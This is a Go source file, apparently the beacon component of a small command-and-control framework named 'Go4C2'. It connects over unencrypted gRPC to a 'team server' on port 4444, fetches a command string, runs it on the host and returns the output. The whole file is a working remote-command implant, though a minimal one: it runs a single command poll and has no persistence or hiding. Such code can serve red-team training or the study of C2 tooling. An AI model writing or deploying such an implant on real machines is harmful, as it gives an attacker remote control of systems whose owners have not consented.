package main

import (
	"Go4C2/grpcapi"
	"context"
	"fmt"
	"log"
	"os/exec"
	"strings"

	"google.golang.org/grpc"
)

var (
	g_strTeamServer     = "localhost"
	g_nBeaconServerPort = 4444
)

func main() {
	var (
		conn         *grpc.ClientConn
		err          error
		beaconClient grpcapi.BeaconClient
		cmdline      *grpcapi.Command
	)

	// 1. connect to the team server
	server := fmt.Sprintf("%s:%d", g_strTeamServer, g_nBeaconServerPort)
	conn, err = grpc.Dial(server, grpc.WithInsecure())
	if nil != err {
		log.Fatalf("grpc.Dial error: %v", err)
	}

	// 2. init client
	beaconClient = grpcapi.NewBeaconClient(conn)

	// begin polling
	context := context.Background()
	req := new(grpcapi.Empty)
	cmdline, err = beaconClient.FetchCommand(context, req)
	{
		if err != nil {
			log.Fatalf("beaconClient.FetchCommand: %v", err)
		}

		if "" == cmdline.In {
			// no work
			log.Print("no work")
		}
		// execute the cmdline from team server
		var cmd *exec.Cmd
		cmds := strings.Split(cmdline.In, " ")
		if 1 == len(cmds) {
			cmd = exec.Command(cmds[0])
		} else {
			cmd = exec.Command(cmds[0], cmds[1:]...)
		}

		var arrBytesRes []byte
		arrBytesRes, err = cmd.CombinedOutput()
		if nil != err {
			cmdline.Out = err.Error()
		}
		cmdline.Out += string(arrBytesRes)
		beaconClient.SendResult(context, cmdline)
		log.Printf("response: %s", cmdline.Out)

	}
}
